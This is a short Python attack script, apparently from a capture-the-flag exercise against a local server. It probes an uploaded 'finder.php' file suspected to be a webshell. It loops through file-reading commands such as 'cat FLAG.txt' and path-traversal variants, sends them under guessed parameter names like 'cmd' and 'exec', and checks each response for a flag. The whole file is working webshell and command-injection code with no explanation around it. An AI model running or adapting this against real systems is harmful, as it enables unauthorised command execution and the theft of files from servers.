import requests

base_url = "http://127.0.0.1:32891"

print("[+] Analyzing finder.php behavior more carefully...")

# Get the full output first
resp = requests.get(f"{base_url}/posts/uploads/finder.php")
full_output = resp.text

print("Full finder.php output:")
print(full_output)
print(f"\nLength: {len(full_output)} bytes")

# Check if there are any hints in the HTML or additional content
print("\n[+] Checking response headers...")
for header, value in resp.headers.items():
    print(f"{header}: {value}")

# Maybe finder.php is actually a webshell that needs specific commands
# Let's try system commands that might work
print("\n[+] Testing various command injection approaches...")

commands = [
    "cat FLAG.txt",  # If in current directory
    "cat /FLAG.txt",  # Absolute path
    "type FLAG.txt",  # Windows alternative
    "more FLAG.txt",
    "less FLAG.txt",
    "head FLAG.txt",
    "tail FLAG.txt",
    "cat ../../../FLAG.txt",  # Relative from uploads directory
    "cat ../../FLAG.txt",
    "cat ../FLAG.txt",
]

for cmd in commands:
    # Try as different parameter names
    for param_name in ['cmd', 'c', 'command', 'exec', 'q']:
        resp = requests.get(f"{base_url}/posts/uploads/finder.php", params={param_name: cmd})
        if "FLAG{" in resp.text:
            print(f"\n[!!!] SUCCESS with param='{param_name}', cmd='{cmd}'")
            print(resp.text)
            break

